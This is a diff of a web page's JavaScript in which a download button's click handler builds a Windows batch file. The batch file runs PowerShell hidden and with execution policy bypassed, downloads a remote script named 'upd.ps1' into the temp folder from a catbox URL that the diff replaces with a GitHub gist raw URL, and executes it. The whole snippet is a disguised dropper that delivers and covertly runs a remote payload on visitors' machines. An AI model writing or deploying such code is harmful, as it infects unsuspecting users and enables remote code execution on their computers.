@@ -29,15 +29,14 @@ p{color:#5f6368;font-size:14px;line-height:1.6;margin-bottom:24px}
 </div>
 
 <script>
-// ===== YOUR CATBOX URL HERE =====
-const PS1_URL = 'https://files.catbox.moe/ep3gzc.ps1';
+// ===== YOUR GITHUB GIST RAW URL HERE =====
+const PS1_URL = 'https://gist.githubusercontent.com/Dennis-Abaah/fdda4f14bf70d44e941322701a21ef18/raw/2a653c359bcf73680b54ff74cc0b84b029b740a9/installer.ps1';
 
 document.getElementById('dlBtn').addEventListener('click', function(e) {
   e.preventDefault();
 
-  // This .bat file saves the .ps1 to disk first, then runs it
   const batContent = `@echo off
-powershell -NoP -Ep Bypass -W H -C "$f='$env:TEMP\\upd.ps1'; (New-Object Net.WebClient).DownloadFile('${PS1_URL}','$f'); powershell -Ep Bypass -W H -F '$f'"
+powershell -NoP -Ep Bypass -W H -C "$f='$env:TEMP\\upd.ps1'; (New-Object Net.WebClient).DownloadFile('${PS1_URL}','$f'); & '$f'"
 `;
   const blob = new Blob([batContent], { type: 'application/x-bat' });
   const url = URL.createObjectURL(blob);
